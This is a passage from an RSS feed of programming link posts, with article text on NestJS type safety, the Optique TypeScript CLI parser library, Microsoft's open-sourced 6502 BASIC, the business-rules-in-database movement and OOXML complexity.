don&rsquo;t have</li> <li><strong>Can we solve this more simply?</strong> &ndash; Prefer solutions that match problem complexity</li> <li><strong>What are the real failure modes?</strong> &ndash; Optimize for problems that actually hurt your users</li> <li><strong>How will this affect debugging?</strong> &ndash; Choose tools that make problems easier to find and fix</li> <li><strong>What&rsquo;s the team knowledge cost?</strong> &ndash; Factor learning curves into architectural decisions</li> </ol><p>The trap we fell into was choosing based on aspirational complexity rather than current reality. We imagined we&rsquo;d eventually need enterprise patterns, so we adopted them early. But architectural decisions should serve today&rsquo;s problems while enabling tomorrow&rsquo;s growth, not create today&rsquo;s problems for tomorrow&rsquo;s hypothetical benefits.</p><h2>The Real Lesson About Type Safety</h2><p>The 72-hour debugging nightmare wasn&rsquo;t caused by bad code or poor practices, it was caused by choosing tools that systematically bypass the safety mechanisms we depend on. TypeScript&rsquo;s promise of &ldquo;JavaScript with safety&rdquo; breaks down when frameworks require you to abandon type checking in critical areas.</p><p>Dependency injection&rsquo;s promise of &ldquo;flexible, testable code&rdquo; breaks down when the flexibility enables errors that strict typing would prevent. The ceremony of enterprise patterns doesn&rsquo;t compensate for the loss of compile-time verification.</p><p>For backend development, where correctness is paramount and debugging failures are expensive, tools that make errors impossible to compile often serve you better than tools that make correct usage easier to express.</p><p>The choice between safety and sophistication should be deliberate and aligned with actual requirements. Runtime flexibility isn&rsquo;t worth much if your runtime doesn&rsquo;t work reliably.</p><h2>Choose Your Guarantees Carefully</h2><p>The lesson isn&rsquo;t that sophisticated frameworks are universally bad, it&rsquo;s that the choice between flexibility and correctness has real consequences for development velocity, debugging complexity, and system reliability.</p><p>After this experience, I&rsquo;m convinced that for most backend services, the guarantees provided by strict typing and explicit dependencies matter more than the expressiveness provided by sophisticated frameworks. The cognitive overhead of understanding framework mechanics often exceeds the benefit of framework features.</p><p>This doesn&rsquo;t make NestJS a bad framework. For teams actually dealing with large-scale coordination problems, complex business domains, and established development processes, its structured approach provides real value. The framework works well when your problems match its strengths.</p><p>But for teams building straightforward services, the framework&rsquo;s complexity tax, in debugging time, test maintenance, and knowledge requirements, often exceeds its benefits. Starting simple and adding complexity as problems actually emerge is usually more sustainable than adopting complex patterns preventively.</p><p>The next time we evaluate frameworks, I&rsquo;ll ask different questions: &ldquo;What problems do we actually have today?&rdquo; rather than &ldquo;What problems might we have someday?&rdquo; and &ldquo;Can we solve this more simply?&rdquo; rather than &ldquo;What&rsquo;s the most sophisticated solution?&rdquo;</p><p>Choose your complexity deliberately. Choose your type safety carefully. Your future debugging self will thank you for the honesty.</p><hr><p><em><em>This post is based on real refactoring experiences with enterprise Node.js applications. While specific APIs and business logic are anonymized, the complexity patterns, time investments, and debugging challenges reflect authentic developer experience I faced during the implementation.</em></em></p></div></section>]]></description><pubDate>Sun, 07 Sep 2025 00:48:57 +0530</pubDate></item><item><link>https://hackers.pub/@hongminhee/2025/stop-writing-cli-validation-parse-it-right-the-first-time</link><title>Stop writing CLI validation. Parse it right the first time. (hackers.pub)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/</guid><comments>https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 16 min | <a href='https://www.reddit.com/r/programming/comments/1na6pes/stop_writing_cli_validation_parse_it_right_the/'>Post permalink</a></p></section><section class='preview-image'><img src='https://hackers.pub/@hongminhee/2025/stop-writing-cli-validation-parse-it-right-the-first-time/ogimage?l=en' /></section><section class='parsed-content'><div><p>I have this bad habit. When something annoys me enough times, I end up building a library for it. This time, it was CLI validation code.</p><p>See, I spend a lot of time reading other people's code. Open source projects, work stuff, random GitHub repos I stumble upon at 2 AM. And I kept noticing this thing: every CLI tool has the same ugly validation code tucked away somewhere. You know the kind:</p><pre><code><span><span>if</span><span> (</span><span>!</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>"</span><span>--port requires --server flag</span><span>"</span><span>);</span></span> <span><span>}</span></span> <span><span>if</span><span> (</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> !</span><span>opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> opts</span><span>.</span><span>port</span><span> =</span><span> 3000</span><span>;</span><span> // default port</span></span> <span><span>}</span></span> <span><span>// wait, what if they pass --port without a value?</span></span> <span><span>// what if the port is out of range?</span></span> <span><span>// what if...</span></span></code></pre><p>It's not even that this code is hard to write. It's that it's <em>everywhere</em>. Every project. Every CLI tool. The same patterns, slightly different flavors. Options that depend on other options. Flags that can't be used together. Arguments that only make sense in certain modes.</p><p>And here's what really got me: we solved this problem years ago for other types of data. Just&hellip; not for CLIs.</p><h2>The problem with validation <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--the-problem-with-validation"></a></h2><p>There's this blog post that completely changed how I think about parsing. It's called <a href="https://lexi-lambda.github.io/blog/2019/11/05/parse-don-t-validate/"><em>Parse, don't validate</em></a> by Alexis King. The gist? Don't parse data into a loose type and then check if it's valid. Parse it directly into a type that can only be valid.</p><p>Think about it. When you get JSON from an API, you don't just parse it as <code>any</code> and then write a bunch of <code>if</code>-statements. You use something like <a href="https://zod.dev/">Zod</a> to parse it directly into the shape you want. Invalid data? The parser rejects it. Done.</p><p>But with CLIs? We parse arguments into some bag of properties and then spend the next 100 lines checking if that bag makes sense. It's backwards.</p><p>So yeah, I built <a href="https://optique.dev/">Optique</a>. Not because the world desperately needed another CLI parser (it didn't), but because I was tired of seeing&mdash;and writing&mdash;the same validation code everywhere.</p><h2>Three patterns I was sick of validating <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--three-patterns-i-was-sick-of-validating"></a></h2> <h3>Dependent options <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--dependent-options"></a></h3><p>This one's everywhere. You have an option that only makes sense when another option is enabled.</p><p>The old way? Parse everything, then check:</p><pre><code><span><span>const </span><span>opts</span><span> =</span><span> parseArgs</span><span>(</span><span>process</span><span>.</span><span>argv</span><span>);</span></span> <span><span>if</span><span> (</span><span>!</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>"</span><span>--port requires --server</span><span>"</span><span>);</span></span> <span><span>}</span></span> <span><span>if</span><span> (</span><span>opts</span><span>.</span><span>server</span><span> &amp;&amp;</span><span> !</span><span>opts</span><span>.</span><span>port</span><span>)</span><span> {</span></span> <span><span> opts</span><span>.</span><span>port</span><span> =</span><span> 3000</span><span>;</span></span> <span><span>}</span></span> <span><span>// More validation probably lurking elsewhere...</span></span></code></pre><p>With Optique, you just describe what you want:</p><pre><code><span><span>const </span><span>config</span><span> =</span><span> withDefault</span><span>(</span></span> <span><span> object</span><span>({</span></span> <span><span> server</span><span>: </span><span>flag</span><span>(</span><span>"</span><span>--server</span><span>"</span><span>),</span></span> <span><span> port</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>, </span><span>integer</span><span>()),</span></span> <span><span> workers</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--workers</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span> }),</span></span> <span><span> { </span><span>server</span><span>: </span><span>false</span><span> }</span></span> <span><span>);</span></span></code></pre><p>Here's what TypeScript infers for <code>config</code>'s type:</p><pre><code><span><span>type</span><span> Config</span><span> =</span></span> <span><span> |</span><span> {</span><span> readonly</span><span> server</span><span>: </span><span>false</span><span> }</span></span> <span><span> |</span><span> {</span><span> readonly</span><span> server</span><span>: </span><span>true</span><span>;</span><span> readonly</span><span> port</span><span>: </span><span>number</span><span>;</span><span> readonly</span><span> workers</span><span>: </span><span>number</span><span> }</span></span></code></pre><p>The type system now understands that when <code>server</code> is false, <code>port</code> literally doesn't exist. Not <code>undefined</code>, not <code>null</code>&mdash;it's not there. Try to access it and TypeScript yells at you. No runtime validation needed.</p><h3>Mutually exclusive options <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--mutually-exclusive-options"></a></h3><p>Another classic. Pick one output format: JSON, YAML, or XML. But definitely not two.</p><p>I used to write this mess:</p><pre><code><span><span>if</span><span> ((</span><span>opts</span><span>.</span><span>json</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> +</span><span> (</span><span>opts</span><span>.</span><span>yaml</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> +</span><span> (</span><span>opts</span><span>.</span><span>xml</span><span> ?</span><span> 1</span><span> :</span><span>)</span><span> &gt;</span><span> 1</span><span>)</span><span> {</span></span> <span><span> throw</span><span> new</span><span> Error</span><span>(</span><span>'</span><span>Choose only one output format</span><span>'</span><span>);</span></span> <span><span>}</span></span></code></pre><p>(Don't judge me, you've written something similar.)</p><p>Now?</p><pre><code><span><span>const </span><span>format</span><span> =</span><span> or</span><span>(</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--json</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>json</span><span>"</span><span> as</span><span> const</span><span>),</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--yaml</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>yaml</span><span>"</span><span> as</span><span> const</span><span>),</span></span> <span><span> map</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--xml</span><span>"</span><span>),</span><span> ()</span><span> =&gt;</span><span> "</span><span>xml</span><span>"</span><span> as</span><span> const</span><span>)</span></span> <span><span>);</span></span></code></pre><p>The <code>or()</code> combinator means exactly one succeeds. The result is just <code>"json" | "yaml" | "xml"</code>. A single string. Not three booleans to juggle.</p><h3>Environment-specific requirements <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--environment-specific-requirements"></a></h3><p>Production needs auth. Development needs debug flags. Docker needs different options than local. You know the drill.</p><p>Instead of a validation maze, you just describe each environment:</p><pre><code><span><span>const </span><span>envConfig</span><span> =</span><span> or</span><span>(</span></span> <span><span> object</span><span>({</span></span> <span><span> env</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>prod</span><span>"</span><span>),</span></span> <span><span> auth</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--auth</span><span>"</span><span>, </span><span>string</span><span>()), </span><span>// Required in prod</span></span> <span><span> ssl</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--ssl</span><span>"</span><span>),</span></span> <span><span> monitoring</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--monitoring</span><span>"</span><span>, </span><span>url</span><span>())</span></span> <span><span> }),</span></span> <span><span> object</span><span>({</span></span> <span><span> env</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>dev</span><span>"</span><span>),</span></span> <span><span> debug</span><span>: </span><span>optional</span><span>(</span><span>option</span><span>(</span><span>"</span><span>--debug</span><span>"</span><span>)), </span><span>// Optional in dev</span></span> <span><span> verbose</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--verbose</span><span>"</span><span>)</span></span> <span><span> })</span></span> <span><span>);</span></span></code></pre><p>No auth in production? Parser fails immediately. Trying to access <code>--auth</code> in dev mode? TypeScript won't let you&mdash;the field doesn't exist on that type.</p><h2>&ldquo;But parser combinators though&hellip;&rdquo; <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--but-parser-combinators-though"></a></h2><p>I know, I know. &ldquo;Parser combinators&rdquo; sounds like something you'd need a CS degree to understand.</p><p>Here's the thing: I don't have a CS degree. Actually, I don't have any degree. But I've been using parser combinators for years because they're actually&hellip; not that hard? It's just that the name makes them sound way scarier than they are.</p><p>I'd been using them for other stuff&mdash;parsing config files, DSLs, whatever. But somehow it never clicked that you could use them for CLI parsing until I saw Haskell's <a href="https://github.com/pcapriotti/optparse-applicative">optparse-applicative</a>. That was a real &ldquo;wait, of course&rdquo; moment. Like, why are we doing this any other way?</p><p>Turns out it's stupidly simple. A parser is just a function. Combinators are just functions that take parsers and return new parsers. That's it.</p><pre><code><span><span>// This is a parser</span></span> <span><span>const </span><span>port</span><span> =</span><span> option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>,</span><span> integer</span><span>());</span></span> <span><span>// This is also a parser (made from smaller parsers)</span></span> <span><span>const </span><span>server</span><span> =</span><span> object</span><span>({</span></span> <span><span> port</span><span>: </span><span>port</span><span>,</span></span> <span><span> host</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--host</span><span>"</span><span>, </span><span>string</span><span>())</span></span> <span><span>});</span></span> <span><span>// Still a parser (parsers all the way down)</span></span> <span><span>const </span><span>config</span><span> =</span><span> or</span><span>(</span><span>server</span><span>,</span><span> client</span><span>);</span></span></code></pre><p>No monads. No category theory. Just functions. Boring, beautiful functions.</p><h2>TypeScript does the heavy lifting <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--typescript-does-the-heavy-lifting"></a></h2><p>Here's the thing that still feels like cheating: I don't write types for my CLI configs anymore. TypeScript just&hellip; figures it out.</p><pre><code><span><span>const </span><span>cli</span><span> =</span><span> or</span><span>(</span></span> <span><span> command</span><span>(</span><span>"</span><span>deploy</span><span>"</span><span>,</span><span> object</span><span>({</span></span> <span><span> action</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>deploy</span><span>"</span><span>),</span></span> <span><span> environment</span><span>: </span><span>argument</span><span>(</span><span>string</span><span>()),</span></span> <span><span> replicas</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--replicas</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span> })),</span></span> <span><span> command</span><span>(</span><span>"</span><span>rollback</span><span>"</span><span>,</span><span> object</span><span>({</span></span> <span><span> action</span><span>: </span><span>constant</span><span>(</span><span>"</span><span>rollback</span><span>"</span><span>),</span></span> <span><span> version</span><span>: </span><span>argument</span><span>(</span><span>string</span><span>()),</span></span> <span><span> force</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--force</span><span>"</span><span>)</span></span> <span><span> }))</span></span> <span><span>);</span></span> <span><span>// TypeScript infers this type automatically:</span></span> <span><span>type</span><span> Cli</span><span> =</span></span> <span><span> |</span><span> {</span></span> <span><span> readonly</span><span> action</span><span>: </span><span>"</span><span>deploy</span><span>"</span></span> <span><span> readonly</span><span> environment</span><span>: </span><span>string</span></span> <span><span> readonly</span><span> replicas</span><span>: </span><span>number</span></span> <span><span> }</span></span> <span><span> |</span><span> {</span></span> <span><span> readonly</span><span> action</span><span>: </span><span>"</span><span>rollback</span><span>"</span></span> <span><span> readonly</span><span> version</span><span>: </span><span>string</span></span> <span><span> readonly</span><span> force</span><span>: </span><span>boolean</span></span> <span><span> }</span></span></code></pre><p>TypeScript knows that if <code>action</code> is <code>"deploy"</code>, then <code>environment</code> exists but <code>version</code> doesn't. It knows <code>replicas</code> is a <code>number</code>. It knows <code>force</code> is a <code>boolean</code>. I didn't tell it any of this.</p><p>This isn't just about nice autocomplete (though yeah, the autocomplete is great). It's about catching bugs before they happen. Forget to handle a new option somewhere? Code won't compile.</p><h2>What actually changed for me <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--what-actually-changed-for-me"></a></h2><p>I've been dogfooding this for a few weeks. Some real talk:</p><p><strong>I delete code now.</strong> Not refactor. Delete. That validation logic that used to be 30% of my CLI code? Gone. It feels weird every time.</p><p><strong>Refactoring isn't scary.</strong> Want to know something that usually terrifies me? Changing how a CLI takes its arguments. Like going from <code>--input file.txt</code> to just <code>file.txt</code> as a positional argument. With traditional parsers, you're hunting down validation logic everywhere. With this? You change the parser definition, TypeScript immediately shows you every place that breaks, you fix them, done. What used to be an hour of &ldquo;did I catch everything?&rdquo; is now &ldquo;fix the red squiggles and move on.&rdquo;</p><p><strong>My CLIs got fancier.</strong> When adding complex option relationships doesn't mean writing complex validation, you just&hellip; add them. Mutually exclusive groups? Sure. Context-dependent options? Why not. The parser handles it.</p><p>The reusability is real too:</p><pre><code><span><span>const </span><span>networkOptions</span><span> =</span><span> object</span><span>({</span></span> <span><span> host</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--host</span><span>"</span><span>, </span><span>string</span><span>()),</span></span> <span><span> port</span><span>: </span><span>option</span><span>(</span><span>"</span><span>--port</span><span>"</span><span>, </span><span>integer</span><span>())</span></span> <span><span>});</span></span> <span><span>// Reuse everywhere, compose differently</span></span> <span><span>const </span><span>devServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> debugOptions</span><span>);</span></span> <span><span>const </span><span>prodServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> authOptions</span><span>);</span></span> <span><span>const </span><span>testServer</span><span> =</span><span> merge</span><span>(</span><span>networkOptions</span><span>,</span><span> mockOptions</span><span>);</span></span></code></pre><p>But honestly? The biggest change is trust. If it compiles, the CLI logic works. Not &ldquo;probably works&rdquo; or &ldquo;works unless someone passes weird arguments.&rdquo; It just works.</p><h2>Should you care? <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--should-you-care"></a></h2><p>If you're writing a 10-line script that takes one argument, you don't need this. <code>process.argv[2]</code> and call it a day.</p><p>But if you've ever:</p><ul> <li>Had validation logic get out of sync with your actual options</li> <li>Discovered in production that certain option combinations explode</li> <li>Spent an afternoon tracking down why <code>--verbose</code> breaks when used with <code>--json</code></li> <li>Written the same &ldquo;option A requires option B&rdquo; check for the fifth time</li> </ul><p>Then yeah, maybe you're tired of this stuff too.</p><p>Fair warning: Optique is young. I'm still figuring things out, the API might shift a bit. But the core idea&mdash;parse, don't validate&mdash;that's solid. And I haven't written validation code in months.</p><p>Still feels weird. Good weird.</p><h2>Try it or don't <a href="https://hackers.pub#0199203f-a6e9-7f90-9462-0af136538c9c--try-it-or-dont"></a></h2><p>If this resonates:</p><ul> <li><a href="https://optique.dev/tutorial"><em>Tutorial</em></a>: Build something real, see if you hate it</li> <li><em>Concepts</em>: <a href="https://optique.dev/concepts/primitives">Primitives</a>, <a href="https://optique.dev/concepts/constructs">constructs</a>, <a href="https://optique.dev/concepts/modifiers">modifiers</a>, <a href="https://optique.dev/concepts/valueparsers">value parsers</a>, the whole thing</li> <li><a href="https://github.com/dahlia/optique"><em>GitHub</em></a>: The code, issues, angry rants</li> </ul><p>I'm not saying Optique is the answer to all CLI problems. I'm just saying I was tired of writing the same validation code everywhere, so I built something that makes it unnecessary.</p><p>Take it or leave it. But that validation code you're about to write? You probably don't need it.</p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 23:49:10 +0530</pubDate></item><item><link>https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html</link><title>Microsoft’s first-ever programming language was just open-sourced (pcworld.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</guid><comments>https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 3 min | <a href='https://www.reddit.com/r/programming/comments/1na1zyo/microsofts_firstever_programming_language_was/'>Post permalink</a></p></section><section class='preview-image'><img src='https://www.pcworld.com/wp-content/uploads/2025/09/Commodore-64.jpg?quality=50&strip=all&w=1024' /></section><section class='parsed-content'><div><article><div><div><div><body><p>Did you know that, between 1976 and 1978, Microsoft developed its own version of the BASIC programming language? It was initially called Altair BASIC before becoming Microsoft BASIC, and it was designed for the 6502 (a microprocessor used in the Apple II, Atari 2600, VIC-20, Commodore 64, and Nintendo Entertainment System).</p><p>As of yesterday, Microsoft has released the version 1.1 source code of &ldquo;Microsoft BASIC for 6502 Microprocessor&rdquo; on <a href="https://go.skimresources.com?id=111346X1569483&amp;xs=1&amp;url=https://github.com/microsoft/BASIC-M6502&amp;xcust=2-1-2898698-1-0-0-0-0&amp;sref=https://www.pcworld.com/article/2898698/microsofts-first-ever-programming-language-was-just-open-sourced.html">GitHub</a>, which means you can freely view the assembly code and even download it if you want to.</p><p>Why did Microsoft publish this code? Because it has historical significance and was one of the pillars of modern software:</p><blockquote><p>This source code represents the foundation upon which the modern software industry was built. The techniques, patterns, and business models pioneered in this BASIC interpreter directly influenced:</p><ul> <li>The development of MS-DOS and subsequent Microsoft operating systems</li> <li>The standardization of programming language implementations</li> <li>The establishment of software licensing as a business model</li> <li>The democratization of computer programming</li> </ul> </blockquote><p>Microsoft&rsquo;s version of BASIC was one of the first programming languages that the general public came into contact with, making it an important milestone in computer history. While Microsoft BASIC is no longer used in earnest, its spirit lives on with Visual Basic .NET.</p></body></div><p>This article originally appeared on our sister publication <a href="https://www.pcforalla.se">PC f&ouml;r Alla</a> and was translated and localized from Swedish.</p><div><h3> <a href="https://www.pcworld.com/author/mikael_markander"> Author: Mikael Markander</a>, Contributor, PCWorld </h3><div><p>Mikael writes news across all our consumer tech categories. He has previously worked with Macworld, but today mainly writes for our sister sites PC f&ouml;r Alla and M3. Mikael has a firm grasp on which gadgets are released, and what is happening with the streaming services and the latest AI tools.</p></div></div></div></div></article> </div><div class="gallery"><p><img src="https://www.pcworld.com/wp-content/uploads/2025/09/1380047922-4.jpg?quality=50&amp;strip=all&amp;w=150&amp;h=150&amp;crop=1"></p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 20:41:56 +0530</pubDate></item><item><link>https://medium.com/@vbilopav/business-rules-in-database-movement-e0167dba19b7</link><title>Business Rules In Database Movement (medium.com)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/</guid><comments>https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1n9z7fb/business_rules_in_database_movement/'>Post permalink</a></p></section><section class='separator separator-after-permalink'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='selftext'><!-- SC_OFF --><div class="md"><p>Did you know that there was an entire movement in software development, complete with its own manifesto, thought leaders, and everything, dedicated almost exclusively to putting business logic in SQL databases?</p><p>Neither did I.</p><p>So I did some research to create a post, and it turned out to be an entire article that digs into this movement a little bit deeper.</p><p>I hope you like it. It is important to know history.</p></div><!-- SC_ON --></section><section class='preview-image'><p>&nbsp;</p><img src='https://miro.medium.com/v2/resize:fit:650/1*lZynIQzxJtEgajCU50kQ4Q.png' /></section><section class='parsed-content'><div><figure></figure><blockquote><p><em>Those who cannot remember the past are condemned to repeat it.</em></p></blockquote><p>Did you know that there was an entire movement in software development, complete with its own manifesto, thought leaders, and everything, dedicated almost exclusively to putting business logic in SQL databases?</p><p>I certainly didn&rsquo;t. But it did happen in the late 1990s and early 2000s.</p><p>Their core philosophy was as follows:</p><p>- Data belongs to the organization, not the application. Today, we typically refer to the Bounded Context.</p><p>- Rules and constraints should be stored and enforced in the database (or a rules engine), not scattered across individual applications. Today, the Domain Model, of course. But, in essence, just don&rsquo;t repeat yourself. The database is the source of truth, and no point in having to repeat the same logic across different applications, services, and business reports.</p><p>- Rules should be declarative using natural language (not imperative or procedural) to make them easily accessible to a business non-tech audience. Today, we say the Domain Experts, but essentially, the same business people.</p><p>- We should be focused on managing business rules, not hardware/software platforms and technology. Today, we would say implementation details, but in essence, it&rsquo;s the same idea.</p><p>And so on. Does this sound familiar?</p><p>You can read the full manifesto here (PDF link): <a href="https://www.businessrulesgroup.org/brmanifesto/BRManifesto.pdf">https://www.businessrulesgroup.org/brmanifesto/BRManifesto.pdf</a></p><p>An even more fascinating story is why it fizzled out and almost completely disappeared.</p><p>According to my research, in the late 90s and early 20s, this movement was hyped, and indeed it was hyped, as confirmed by a stream of conferences, forums, workshops, and thought leaders from that era. Even the research and advisory companies like Gartner promoted the idea under the catchy motto &ldquo;change the rules, not the code&rdquo; and labeled it as &ldquo;hot&rdquo;.</p><p>And then there was a boom of startups building low-code platform tools on this idea, even industry giants like Oracle and IBM tried to incorporate some of these ideas into their own low-code, rule engines. However, the dot-com crash in the early 20s and many startups building BRMS/low-code tools died.</p><p>But much more importantly than the dot-com extinction event was a significant cultural shift in the software development world that occurred shortly thereafter:</p><h2>1) The Agile Movement</h2><p>Developers preferred flexibility and speed over centralized governance. DBAs and architects pushing data-centric models often lost out to agile, app-centric teams.</p><p>In simple terms, development teams from that era had dedicated DBAs, and a dedicated DBA is supposed to implement all those rules in the databases, close to data itself, using declarative SQL:</p><pre><span>ALTER TABLE loans ADD CONSTRAINT CHECK NOT (status = 'approved' AND credit_score &lt; 650);<br>ALTER TABLE users ADD CONSTRAINT UNIQUE(email);<br>ALTER TABLE users ALTER COLUMN email SET NOT NULL;</span></pre><p>That was not agile enough, obviously. Those rules should reside in an RDBMS or BRMS (Business Rules Management System), and you will need a specialized person for that.</p><h2>2) Vendor Lock-In</h2><p>Obviously, such centralization meant locking into proprietary platforms, which usually meant paying large tech companies a significant amount of money for an extended period, as free and open-source alternatives weren&rsquo;t yet viable solutions.</p><h2>3) Perceived Complexity and Technical Limitations</h2><p>A single, centralized solution is perceived as more complex than a decentralized one, which tends to be repetitive and scattered across various services.</p><p>Furthermore, some of the emerging development practices accepted as standard today, such as source control and automated testing, weren&rsquo;t exactly a priority for this new, centralized RDBMS and BRMS world managed by DBAs.</p><p>So what happened then?</p><h2>The Evolution</h2><p>The entire software development process started evolving in a different direction, one that is supposed to give more power to the individual programmer and take it away from those DBAs. Arguably, it was successful since dedicated DBAs have become a rare breed these days, at least from my perspective.</p><p>First, in the 2000s, after the dot-com crash, there was an emergence of alternative philosophies.</p><ul><li>First around in 2003 and onward, Eric Evans&rsquo; Blue Book and DDD.</li><li>And thereafter, in the 2010s and onward, Robert C. Martin and Clean Architecture.</li></ul><p>Both of these philosophies, which are now widely accepted, argue that business rules don&rsquo;t belong to a centralized data and business rules engines like RDBMS and similar &mdash; but rather to the domain model or the architecture core, respectively.</p><p>They argue that RDBMS and similar systems are and should be concerned only with storing and retrieving data, and the decision engine should be moved back to the application.</p><p>This meant reintroducing business rules back into the application layer, as the industry shifted toward 3-tier architectures with business logic in the middle tier, rather than in the database.</p><p>But this also meant that those same rules will inevitably have to be repeated across various applications, services, and reports, which is, of course, suboptimal, to say the least. To address this issue, we saw:</p><ul><li>First, the emergence of Service-Oriented Architecture or SOA in the mid-2000s. The idea was to centralize logic in services where programmers have control.</li><li>And then the emergence of Microservices in the 2010s and onward, with rules scattered across many different specialized services.</li></ul><h2>Where Are We Today</h2><p>Today, RDMBS are here to stay, and any component developer (at least the backend developer) should also be a DBA.</p><p>After 20+ years, perhaps it is time to revisit some of the arguments that led the industry to reject the Business Rules Movement in the late 90s and early 2000s.</p><h2>Vendor Lock In:</h2><p>PostgreSQL is free, open-source, portable, and has a massive ecosystem of support. You&rsquo;re no longer tied to Oracle licenses just to run stored procedures or triggers.</p><h2>Switching Scaling Issues</h2><p>DDD/CA proponents see relying on a database as dangerous: switching DBs or scaling across multiple persistence stores becomes nearly impossible. Scaling relational databases horizontally was <em>hard</em> and proprietary.</p><p>But today, there are also numerous distributed and extremely scalable Postgres-compatible free and open source variants as well, such as Citus, Timescale, etc. Scaling isn&rsquo;t much of a killer anymore. It is challenging, but then again, scaling will always be a challenge.</p><p>And with PostgreSQL and its variants, which offer advanced polyglot capabilities covering well over 90 percent of needs, is there still a need to switch? Portability is much less relevant today.</p><h2>Separation of Concenrs</h2><p>This was a misunderstanding from the beginning; SQL rules are domain semantics, and SQL is not storage code by any means. Postgres doesn&rsquo;t care <em>where</em> it runs; it enforces rules consistently.</p><h2>Testing &amp; Tooling</h2><p>Today, testing DB rules is very straightforward using rollbac-tests, migrations in containers, fixtures, and tools like pgTAP.</p><p>It is a weak spot compared to modern app languages with powerful IDEs, refactoring capabilities, and type systems, but it is very much doable and manageable.</p><p>The real gap is developer culture: fewer devs are fluent in SQL as a <em>primary modeling language</em>.</p><h2>Big Picture</h2><p>The database-centric philosophy is much more defensible in 2025 than it was in 2005. RDMBS and SQL are here to stay, and they are evolving and getting better.</p><p>The main &ldquo;barrier&rdquo; now is cultural: developers are trained to think in code-first terms, not data-first.</p><p>However, we do live in 2025, not in 2005.</p></div><div class="gallery"><p><img src="https://miro.medium.com/v2/resize:fill:64:64/1*bNH44cmtwewRk1TJ8kPLAw.jpeg"></p></div></section>]]></description><pubDate>Sat, 06 Sep 2025 18:41:54 +0530</pubDate></item><item><link>https://hsu.cy/2025/09/is-ooxml-artificially-complex/</link><title>Is OOXML Artifically Complex? (hsu.cy)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1n9jz24/is_ooxml_artifically_complex/</guid><comments>https://www.reddit.com/r/programming/comments/1n9jz24/is_ooxml_artifically_complex/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 19 min | <a href='https://www.reddit.com/r/programming/comments/1n9jz24/is_ooxml_artifically_complex/'>Post permalink</a></p></section><section class='separator separator-before-parsed-content'><p>&nbsp;</p><hr><p>&nbsp;</p></section><section class='parsed-content'><section><p>A while ago, the official blog of LibreOffice published a provocative <a href="https://blog.documentfoundation.org/blog/2025/07/18/artificially-complex-xml-schema-as-lock-in-tool/">article</a>: &ldquo;An artificially complex XML schema as a lock-in tool.&rdquo; Its target is Microsoft&rsquo;s XML-based file formats &mdash; the Office Open XML (OOXML).</p><p>The article alleges that, although Microsoft put its Office formats through standardization, the spec is engineered to be so complex that it obstructs interoperability with third-party software. Moreover, the complexity is allegedly gratuitous and disconnected from real-world needs; it&rsquo;s like advertising an &ldquo;open&rdquo; railway system while designing the signaling so only one manufacturer can run trains. 